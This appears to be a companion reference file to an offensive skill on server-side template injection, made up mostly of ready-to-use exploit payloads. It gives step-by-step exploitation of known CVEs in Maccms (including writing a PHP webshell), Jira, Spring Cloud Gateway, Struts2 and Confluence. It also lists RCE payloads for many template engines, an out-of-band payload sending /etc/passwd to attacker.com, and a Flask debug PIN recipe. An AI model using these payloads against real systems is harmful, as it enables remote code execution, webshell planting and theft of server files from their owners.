# SSTI — Extended Scenarios & Real-World Cases

> Companion to [SKILL.md](./SKILL.md). Contains additional CVE cases, PHP template exploitation, and expression language crossover scenarios.

---

## 1. CVE Case: Maccms 8.x PHP Template Eval

Maccms (a Chinese CMS) uses `eval()` to process template variables in search functionality:

**Attack path**: `/vod-search` endpoint passes user input into template evaluation.

```
# Step 1: Identify injection point
GET /index.php?m=vod-search&wd={if-A:phpinfo()}{endif-A}

# Step 2: Write webshell (bypass quote filtering via base64):
GET /index.php?m=vod-search&wd={if-A:eval(base64_decode('ZmlsZV9wdXRfY29udGVudHMoJ3NoZWxsLnBocCcsJzw/cGhwIGV2YWwoJF9QT1NUW2FdKTs/PicpOw=='))}{endif-A}
# base64 decodes to: file_put_contents('shell.php','<?php eval($_POST[a]);?>');

# Step 3: Access webshell
POST /shell.php
a=system('id');
```

**Key technique**: base64 encoding to bypass quote/special character filtering in template context.

---

## 2. CVE Case: Atlassian Jira SSTI (CVE-2019-11581)

Jira's "Contact Administrators" form processes template expressions in the subject/body:

**Prerequisites**: "Contact Administrators Form" must be enabled; SMTP must be configured.

```
# Step 1: Navigate to /secure/ContactAdministrators!default.jspa
# Step 2: In the subject or message field, inject:
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')

# Step 3: Submit the form
# Step 4: Check email queue or admin notification for command output
```

**Note**: Output appears in the email sent to administrators, not in the HTTP response. Monitor outbound email or use OOB techniques (DNS/HTTP callback).

---

## 3. Spring Cloud Gateway SpEL Injection (CVE-2022-22947)

Spring Cloud Gateway's actuator endpoint allows adding routes with SpEL expressions in filter arguments:

```bash
# Add malicious route:
POST /actuator/gateway/routes/pwn HTTP/1.1
Content-Type: application/json

{
  "id": "pwn",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "X-Pwn",
      "value": "#{T(java.lang.Runtime).getRuntime().exec('id')}"
    }
  }],
  "uri": "http://example.com",
  "predicates": [{"name": "Path", "args": {"_genkey_0": "/pwn/**"}}]
}

# Refresh to apply:
POST /actuator/gateway/refresh

# Trigger:
GET /pwn/anything
# Check X-Pwn response header for command output
```

Also see the dedicated [expression-language-injection](../expression-language-injection/SKILL.md) skill for SpEL/OGNL deep dives.

---

## 4. Struts2 OGNL → RCE (S2-045 / CVE-2017-5638)

Content-Type header with OGNL expression triggers evaluation in Struts2's multipart parser:

```
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

Also see [expression-language-injection](../expression-language-injection/SKILL.md) for the full OGNL treatment.

---

## 5. Confluence OGNL Injection (CVE-2021-26084)

Confluence Server's `createpage-entervariables.action` evaluates OGNL in query parameters:

```bash
# Probe:
curl -X POST 'https://TARGET/pages/createpage-entervariables.action' \
  -d 'queryString=\u0027%2b{3*3}%2b\u0027'
# If response contains "9" → confirmed

# RCE:
curl -X POST 'https://TARGET/pages/createpage-entervariables.action' \
  -d 'queryString=\u0027%2b{Class.forName("java.lang.Runtime").getMethod("exec",Class.forName("java.lang.String")).invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}%2b\u0027'
```

---

## 6. SSTI vs EL Injection — When to Cross-Reference

| Indicator | Go To |
|---|---|
| `{{7*7}}` returns 49, Python error traces | Stay here (Jinja2/Twig SSTI) |
| `${7*7}` returns 49, Java stack traces | [expression-language-injection](../expression-language-injection/SKILL.md) |
| `%{7*7}` returns 49, Struts2 errors | [expression-language-injection](../expression-language-injection/SKILL.md) |
| Template syntax with `{if-A:...}` style | PHP CMS template eval (this file, scenario 1) |

---

## 7. Additional Template Engines — ASP.NET Razor

```csharp
// Detection
@(1+2)    // Returns 3

// Code execution block
@{
    var proc = new System.Diagnostics.Process();
    proc.StartInfo.FileName = "cmd.exe";
    proc.StartInfo.Arguments = "/c whoami";
    proc.StartInfo.RedirectStandardOutput = true;
    proc.StartInfo.UseShellExecute = false;
    proc.Start();
    var output = proc.StandardOutput.ReadToEnd();
}
<p>@output</p>
```

---

## 8. Additional Template Engines — Elixir EEx/LEEx/HEEx

```elixir
# Basic detection
<%= 7*7 %>

# Command execution
<%= elem(System.shell("id"), 0) %>
<%= System.cmd("cat", ["/etc/passwd"]) |> elem(0) %>

# File read
<%= File.read!("/etc/passwd") %>

# Error-based detection
<%= elem(System.shell("invalid_cmd"), 1) %>

# Boolean-based
<%= if elem(System.shell("test -f /etc/passwd"), 1) == 0, do: "EXISTS", else: "NOPE" %>

# Time-based
<%= System.shell("sleep 5") %>
```

---

## 9. Additional Template Engines — PHP Engines

### Smarty (versions matter)
```php
// Smarty 2.x (deprecated but still found)
{php}system('id');{/php}

// Smarty 3.x+ ({php} removed, use tags)
{system('id')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['c']); ?>",self::clearConfig())}

// Self-reading
{self::getStreamVariable("file:///etc/passwd")}
```

### Latte (Nette framework)
```
{php system('id')}
{='id'|system}
```

### Blade (Laravel) — Rarely exploitable server-side
```
// Raw output (if user controls template source)
{!! system('id') !!}
// @php directive
@php system('id') @endphp
```

### Plates (PHP)
```php
<?php system('id') ?>
// Plates uses raw PHP, so any PHP in template = RCE
```

---

## 10. Additional Template Engines — JavaScript Stack

### Universal Node.js Chain
```javascript
// Works across many JS template engines:
global.process.mainModule.require('child_process').execSync('id').toString()
```

### Pug (formerly Jade)
```
// Detection
#{7*7}

// RCE
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").execSync("id").toString();return sh}()}
```

### Handlebars (older versions RCE chain)
```javascript
// Requires prototype pollution or specific Handlebars version
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Nunjucks
```
// Detection
{{7*7}}

// RCE
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}
```

### EJS
```javascript
// Detection: <% %> tags
<%= 7*7 %>

// RCE
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>
```

### Lodash (_.template)
```javascript
// Detection
${7*7}

// RCE
${global.process.mainModule.require('child_process').execSync('id')}
```

---

## 11. Universal SSTI Detection & Blind Techniques

### Universal Detection Payload
```
${{<%[%'"}}%\.
```
This triggers errors in most template engines, revealing the engine type via error messages.

### Mathematical Detection
```
{{7*7}}     → Jinja2, Twig, Nunjucks
${7*7}      → FreeMarker, Velocity, EJS, Lodash
<%= 7*7 %>  → ERB, EJS, EEx
#{7*7}      → Pug, Slim
@(7*7)      → Razor
{7*7}       → Smarty
(1/0).zxy   → Error-based detection
```

### Blind SSTI (no output reflected)
```
# Boolean-based: compare response length/content for true vs false conditions
{{(3*4/2)==6}}  vs  {{(3*4/2)==7}}

# Time-based (Jinja2):
{% for i in range(10000000) %}{% endfor %}

# OOB (out-of-band):
# Jinja2: {{''.__class__.__mro__[1].__subclasses__()[X]('curl attacker.com/'+open('/etc/passwd').read(),shell=True)}}
```

### Flask Debug PIN Calculation
When Flask debug mode is enabled, calculate the PIN from leaked files:
```
Required values:
1. username: /etc/passwd → find flask process owner
2. modname: usually "flask.app"
3. appname: usually "Flask"
4. modpath: /path/to/flask/app.py (from error page)
5. MAC address: /sys/class/net/eth0/address → convert to decimal
6. machine-id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup (first hex after last /)

Combine: md5(mac + machine_id) → first 9 digits = PIN
```
